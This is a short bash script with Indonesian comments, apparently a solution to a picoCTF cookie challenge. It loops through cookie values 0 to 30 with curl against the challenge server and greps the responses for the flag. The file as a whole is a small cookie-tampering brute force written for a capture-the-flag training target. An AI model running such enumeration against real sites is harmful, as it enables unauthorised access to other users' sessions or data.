#!/bin/bash

# URL yang akan dicek (ubah <port> sesuai dengan port yang benar)
URL="http://mercury.picoctf.net:54219/check"

# Loop untuk nilai cookie dari 0 hingga 24
for i in {0..30}
do
    echo $i
    # Mengirimkan request dengan cookie dan menyimpan hasilnya ke variabel RESPONSE
    RESPONSE=$(curl -s -b "name=$i" "$URL")

    # Mengecek apakah respons mengandung 'picoCTF'
    if [[ $RESPONSE == *"picoCTF"* ]]; then
        # Menampilkan kalimat yang mengandung 'picoCTF'
        echo "$RESPONSE" | grep --color=auto -o ".*picoCTF.*"
    fi

done
